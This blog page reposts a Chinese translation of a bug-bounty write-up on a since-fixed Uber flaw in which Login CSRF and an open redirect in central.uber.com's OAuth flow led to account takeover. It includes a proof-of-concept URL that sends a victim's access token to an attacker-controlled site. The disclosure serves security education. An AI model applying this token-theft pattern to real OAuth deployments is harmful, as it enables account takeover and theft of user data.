@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="zh_CN"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>【挖洞经验】我如何挖到了一个价值8000美金的Uber漏洞 | Java面试</title>
+<meta name="generator" content="Jekyll v3.8.3" />
+<meta property="og:title" content="【挖洞经验】我如何挖到了一个价值8000美金的Uber漏洞" />
+<meta property="og:locale" content="zh_CN" />
+<meta name="description" content="Alpha_h4ck共1730人围观 漏洞 我研究Uber漏洞已经有一段时间了，而这是我第一次发布关于Uber漏洞挖掘的报告，希望可以给大家提供一些有趣的挖洞思路。在这篇文章中，我将会跟大家分享一个我在Uber系统中发现的有趣漏洞（Login CSRF + 开放重定向 -&gt; 账户接管）。" />
+<meta property="og:description" content="Alpha_h4ck共1730人围观 漏洞 我研究Uber漏洞已经有一段时间了，而这是我第一次发布关于Uber漏洞挖掘的报告，希望可以给大家提供一些有趣的挖洞思路。在这篇文章中，我将会跟大家分享一个我在Uber系统中发现的有趣漏洞（Login CSRF + 开放重定向 -&gt; 账户接管）。" />
+<link rel="canonical" href="http://www.jfox.info/2017/%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E6%88%91%E5%A6%82%E4%BD%95%E6%8C%96%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BB%B7%E5%80%BC8000%E7%BE%8E%E9%87%91%E7%9A%84uber%E6%BC%8F%E6%B4%9E.html" />
+<meta property="og:url" content="http://www.jfox.info/2017/%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E6%88%91%E5%A6%82%E4%BD%95%E6%8C%96%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BB%B7%E5%80%BC8000%E7%BE%8E%E9%87%91%E7%9A%84uber%E6%BC%8F%E6%B4%9E.html" />
+<meta property="og:site_name" content="Java面试" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2017-01-01T15:54:27+00:00" />
+<script type="application/ld+json">
+{"description":"Alpha_h4ck共1730人围观 漏洞 我研究Uber漏洞已经有一段时间了，而这是我第一次发布关于Uber漏洞挖掘的报告，希望可以给大家提供一些有趣的挖洞思路。在这篇文章中，我将会跟大家分享一个我在Uber系统中发现的有趣漏洞（Login CSRF + 开放重定向 -&gt; 账户接管）。","@type":"BlogPosting","url":"http://www.jfox.info/2017/%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E6%88%91%E5%A6%82%E4%BD%95%E6%8C%96%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BB%B7%E5%80%BC8000%E7%BE%8E%E9%87%91%E7%9A%84uber%E6%BC%8F%E6%B4%9E.html","headline":"【挖洞经验】我如何挖到了一个价值8000美金的Uber漏洞","dateModified":"2017-01-01T15:54:27+00:00","datePublished":"2017-01-01T15:54:27+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://www.jfox.info/2017/%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E6%88%91%E5%A6%82%E4%BD%95%E6%8C%96%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BB%B7%E5%80%BC8000%E7%BE%8E%E9%87%91%E7%9A%84uber%E6%BC%8F%E6%B4%9E.html"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://www.jfox.info/feed.xml" title="Java面试" /></head><body><header class="site-header" role="banner">
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Java面试</a><nav class="site-nav">
+      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+      <label for="nav-trigger">
+        <span class="menu-icon">
+          <svg viewBox="0 0 18 15" width="18px" height="15px">
+            <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z" />
+          </svg>
+        </span>
+      </label>
+
+      <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+    </nav></div>
+</header><main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">【挖洞经验】我如何挖到了一个价值8000美金的Uber漏洞</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2017-01-01T15:54:27+00:00" itemprop="datePublished">Jan 1, 2017
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    
+<p><a href="https://www.jfox.info/go.php?url=http://www.freebuf.com/author/alpha_h4ck">Alpha_h4ck</a>共<strong>1730</strong>人围观 <a href="https://www.jfox.info/go.php?url=http://www.freebuf.com/./vuls">漏洞</a>
+我研究Uber漏洞已经有一段时间了，而这是我第一次发布关于Uber漏洞挖掘的报告，希望可以给大家提供一些有趣的挖洞思路。在这篇文章中，我将会跟大家分享一个我在Uber系统中发现的有趣漏洞（Login CSRF + 开放重定向 -&gt; 账户接管）。</p>
+
+<h2 id="长话短说">长话短说</h2>
+
+<p>这个漏洞存在于Uber的central.uber.com节点，它使用了OAuth 2.0协议作为其登录授权机制，但该节点并没有正确使用CSRF参数，这将导致攻击者能够利用这种错误使用的状态参数来执行开放重定向以及Login CSRF，然后在实现重定向之后窃取URL哈希中的访问令牌。</p>
+
+<h2 id="centralubercom的登录流程">central.uber.com的登录流程</h2>
+
+<p>首先大家要了解central.uber.com的登录流程（修复前），当用户点击了central.uber.com页面中的登录按钮之后，系统的运行机制和跳转如下：</p>
+
+<p>1.<a href="https://www.jfox.info/go.php?url=https://central.uber.com/login?state=/somewhere">https://central.uber.com/login?state=/somewhere</a></p>
+
+<ol>
+  <li>
+    <p><a href="https://www.jfox.info/go.php?url=https://login.uber.com/oauth/authorize?response_type=code&amp;scope=profile%20history&amp;client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&amp;redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback&amp;state=%2Fsomewhere">https://login.uber.com/oauth/authorize?response_type=code&amp;scope=profile%20history&amp;client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&amp;redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback&amp;state=%2Fsomewhere</a></p>
+  </li>
+  <li>
+    <p><a href="https://www.jfox.info/go.php?url=https://central.uber.com/oauth2-callback?state=%2F&amp;code=it53JtFe6BPGH1arCLxQ6InrT4MXdd">https://central.uber.com/oauth2-callback?state=%2F&amp;code=it53JtFe6BPGH1arCLxQ6InrT4MXdd</a></p>
+  </li>
+  <li>
+    <p><a href="https://www.jfox.info/go.php?url=https://central.uber.com/somewhere">https://central.uber.com/somewhere</a></p>
+  </li>
+</ol>
+
+<p>注:如果你想充分理解这个漏洞的话，你首先必须要清楚该节点所采用的用户登录流程，所以请各位多花点时间好好看看上面给出的跳转链接。</p>
+
+<p>当我看到了整个登录流程之后，我首先想到的攻击方法是将状态参数/somewhere修改为//google.com来实现一次可能的开放重定向。修改之后的登录流程如下：</p>
+
+<ol>
+  <li>
+    <p><a href="https://www.jfox.info/go.php?url=https://central.uber.com/login?state=//google.com">https://central.uber.com/login?state=//google.com</a></p>
+  </li>
+  <li>
+    <p><a href="https://www.jfox.info/go.php?url=https://login.uber.com/oauth/authorize?response_type=code&amp;scope=profile%20history&amp;client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&amp;redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback&amp;state=%2F%2fgoogle.com">https://login.uber.com/oauth/authorize?response_type=code&amp;scope=profile%20history&amp;client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&amp;redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback&amp;state=%2F%2fgoogle.com</a></p>
+  </li>
+  <li>
+    <p><a href="https://www.jfox.info/go.php?url=https://central.uber.com/oauth2-callback?state=%2F%2fgoogle.com&amp;code=it53JtFe6BPGH1arCLxQ6InrT4MXdd">https://central.uber.com/oauth2-callback?state=%2F%2fgoogle.com&amp;code=it53JtFe6BPGH1arCLxQ6InrT4MXdd</a></p>
+  </li>
+  <li>
+    <p>//google.com</p>
+  </li>
+</ol>
+
+<p>果然不出我所料，我成功地将这个登录流程变成了一个开放重定向漏洞，但Uber并不接受关于开放重定向漏洞的报告，所以我还得想办法通过这个漏洞找到其他更有意思的漏洞。但不管怎么样，这仍然是一个非常好的开端。</p>
+
+<p>由于Oauth请求使用的是code而并非token，所以即便是我们找到了一个开放重定向漏洞，我们也仍然无法利用它来窃取到任何信息。那如果我们将请求所使用的code转换为token的话，又会发生什么呢？</p>
+
+<ol>
+  <li>
+    <p><a href="https://www.jfox.info/go.php?url=https://login.uber.com/oauth/authorize?response_type=token&amp;scope=profile%20history&amp;client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&amp;redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback&amp;state=%2F%2fgoogle.com">https://login.uber.com/oauth/authorize?response_type=token&amp;scope=profile%20history&amp;client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&amp;redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback&amp;state=%2F%2fgoogle.com</a></p>
+  </li>
+  <li>
+    <p><a href="https://www.jfox.info/go.php?url=https://central.uber.com/oauth2-callback?state=%2F%2fgoogle.com#access_token=xxxxx">https://central.uber.com/oauth2-callback?state=%2F%2fgoogle.com#access_token=xxxxx</a></p>
+  </li>
+  <li>
+    <p>无法实现重定向</p>
+  </li>
+</ol>
+
+<p>由于我们这里没有给<a href="https://www.jfox.info/go.php?url=https://central.uber.com/oauth2-callback">https://central.uber.com/oauth2-callback</a>提供有效的code值，所以在上述的第2步之后才没能实现重定向。如果无法实现重定向，那我们就没办法窃取到访问令牌了。所以我们得想办法解决这个问题，我们需要一个针对oauth2-callback节点的有效code值。</p>
+
+<h3 id="login-csrf">Login CSRF</h3>
+
+<p>在这种情况下，Login CSRF就要派上用场了。由于这个Uber节点会在重定向时使用 CSRF参数状态，所以我们可以直接将攻击者的有效OAuth code添加到oauth2-callback节点，然后将其发送给目标用户。当用户访问了这条链接之后，就可以被正确地重定向到攻击者所控制的页面并泄露其访问令牌。</p>
+
+<h3 id="限制">限制</h3>
+
+<p>利用这个漏洞时唯一的要求就是目标用户的浏览器中已经存储了login.uber.com的身份认证会话信息（session）。由于central.uber.com是Uber的官方OAuth客户端，所以每一位Uber用户默认都会接受central.uber.com的请求。</p>
+
+<h3 id="概念验证poc">概念验证PoC</h3>
+
+<p>PoC</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://login.uber.com/oauth/authorize?response_type=token&amp;scope=profile%20history%20places%20ride_widgets%20request%20request_receipt%20all_trips&amp;client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&amp;redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback%3fcode%3d攻击者的有效OAuth code&amp;state=%2F%2f攻击者控制的站点
+</code></pre></div></div>
+
+<p>PoC登录流程</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.https://login.uber.com/oauth/authorize?response_type=token&amp;scope=profile%20history%20places%20ride_widgets%20request%20request_receipt%20all_trips&amp;client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&amp;redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback%3fcode%3d{攻击者的有效OAuth code}&amp;state=%2F%2f攻击者控制的站点
+
+2.https://central.uber.com/oauth2-callback?state=%2F%2fhackerone.com&amp;code={攻击者的有效OAuth code}#access_token={目标用户的访问令牌}
+
+3.//hackerone.com#accesstoken={目标用户的访问令牌}
+</code></pre></div></div>
+
+<h3 id="总结">总结</h3>
+
+<p>终于搞定啦！我已经将这个漏洞上报给了Uber的安全技术团队，Uber也在确认了漏洞信息之后给我提供了8000美刀的漏洞奖励。</p>
+
+<p>感谢大家的阅读，如果你有什么其他的观点或想法，请赶紧与我联系吧！（@ngalongc）</p>
+
+<ul>
+  <li>参考来源：ngailong， FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM</li>
+</ul>
+
+  </div>
+  <div style="width:300px;height:250px;float:left;">
+    <!-- 300_250_1 -->
+    <ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-9477174171188196"
+        data-ad-slot="4142158067"></ins>
+    <script>
+        (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+</div>
+<div style="width:300px;height:250px;float:left;">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <!-- 300-250-2 -->
+    <ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-9477174171188196"
+        data-ad-slot="5618891265"></ins>
+    <script>
+        (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+</div><a class="u-url" href="/2017/%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E6%88%91%E5%A6%82%E4%BD%95%E6%8C%96%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BB%B7%E5%80%BC8000%E7%BE%8E%E9%87%91%E7%9A%84uber%E6%BC%8F%E6%B4%9E.html" hidden></a>
+</article>
+<div class="PageNavigation">
+  
+  <a class="prev" href="/2017/nooperationwasfoundwiththename%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93.html">&laquo; No operation was found with the name解决方法总结</a>
+  
+  
+  <a class="next" href="/2017/%E5%8F%8D%E5%87%BB%E7%88%AC%E8%99%AB%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%9A%84%E8%84%91%E6%B4%9E%E5%8F%AF%E4%BB%A5%E6%9C%89%E5%A4%9A%E5%A4%A7.html">反击爬虫，前端工程师的脑洞可以有多大？ &raquo;</a>
+  
+</div>
+<div class="sfix"><!-- 240x600 -->
+<div class="fixedme">
+    <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-9477174171188196" data-ad-slot="9597600460"
+        data-ad-format="auto"></ins>
+    <script>
+        (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+</div>
+<script type="text/javascript">
+    function offset(target) {
+        var top = 0,
+            left = 0
+
+        while (target.offsetParent) {
+            top += target.offsetTop
+            left += target.offsetLeft
+            target = target.offsetParent
+        }
+
+        return {
+            top: top,
+            left: left,
+        }
+    }
+    window.onload = function () {
+        var e = document.getElementsByClassName('sfix')[0];
+        e.offset = offset(e);
+
+        window.onscroll = function (event) {
+            var e = document.getElementsByClassName('sfix')[0];
+            if (window.pageYOffset && e.offset && window.pageYOffset > e.offset.top) {
+                e.style.position = 'fixed';
+                e.style.left = e.offset.left + 'px';
+                e.style.right = 'auto';
+
+
+            } else {
+                e.style.position = 'absolute';
+                e.style.left = 'auto';
+                e.style.right = '-240px';
+
+            }
+        }
+    }
+
+</script></div>
+
+<style>
+  .wrapper {
+    position: relative;
+  }
+
+  .sfix {
+    position: absolute;
+    top: 0;
+    right: -240px;
+    width: 240px;
+    height: 600px;
+  }
+
+  .PageNavigation {
+    font-size: 14px;
+    display: block;
+    width: auto;
+    overflow: hidden;
+    clear: both;
+  }
+
+  .PageNavigation a {
+    display: block;
+    width: 50%;
+    float: left;
+    margin: 1em 0;
+  }
+
+  .PageNavigation .next {
+    text-align: right;
+    float: right;
+  }
+</style>
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Java面试</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Java面试</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
